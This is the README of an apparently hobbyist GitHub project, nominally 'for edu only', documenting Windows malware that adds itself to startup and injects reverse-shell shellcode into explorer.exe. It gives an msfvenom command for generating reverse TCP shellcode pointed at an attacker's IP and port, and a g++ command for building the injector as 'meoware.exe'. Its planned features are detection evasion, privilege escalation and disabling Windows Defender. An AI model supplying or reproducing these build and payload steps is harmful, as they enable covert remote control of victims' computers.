# shellinject for edu  ONLY!



code explain the code is writing itself to windows startup then it finding the pid of explorer.exe 
and injecting shell code in my example its reverse_shell 

------------------------------------------------------------------------------------

you nead to change the pass to the meoware.exe in here + you can change the auto startup name 



![Screenshot (10)](https://github.com/masterconi/shellinject/assets/85493153/8c445392-241b-4eed-a331-b1ce144e0387)


-----------------------------------------------------------------------------------


before use change the shellcode to your shellcode you can generate it useing msfvenom 
for example ```msfvenom --platform windows --arch x64 EXITFUNC=thread -p windows/x64/shell/reverse_tcp_rc4 LHOST=YOURE_IP LPORT=YOURE_PORT RC4PASSWORD=YOURE_PASS EXITFUNC=thread -f c --var-name=ucReverseShell```
copy it to here  
![Screenshot (8)](https://github.com/masterconi/shellinject/assets/85493153/d8ef7109-650f-40f0-af7f-aad2e9be4628)


-------------------------------------------------------------------------------------

plus you can change the executeble to be injected in here :
![Screenshot (9)](https://github.com/masterconi/shellinject/assets/85493153/02713da7-7695-45b3-9ef7-bed1fbe6e6c4)

------------------------------------------------------


to build the repo try to do it with g++ or msvs

g++ example :``` g++ add_to_startup.cpp find_pid.cpp shellinj.cpp -o meoware.exe```

sorry idk how copy it to msvs  ¯\\_(ツ)_/¯

----------------------------------------------------

why i did it ?

i have nothin to do at holidays :-D

--------------------------------------------------------
TODO : make hard to detect , make the shell code encrypted ,  make readme.md more beautiful (✿◡‿◡)


ON_WORKrn: add priv esc ,make the shell code inject "vir.dll" ,disable windows defender :)


i would be happy to get help thanks
----------------------------------------------------------------------------

why the code so shity : 1:becouse i make it in my free time and i am to lazy for makeing it beautiful ,2: shutup scrypt_kiddie


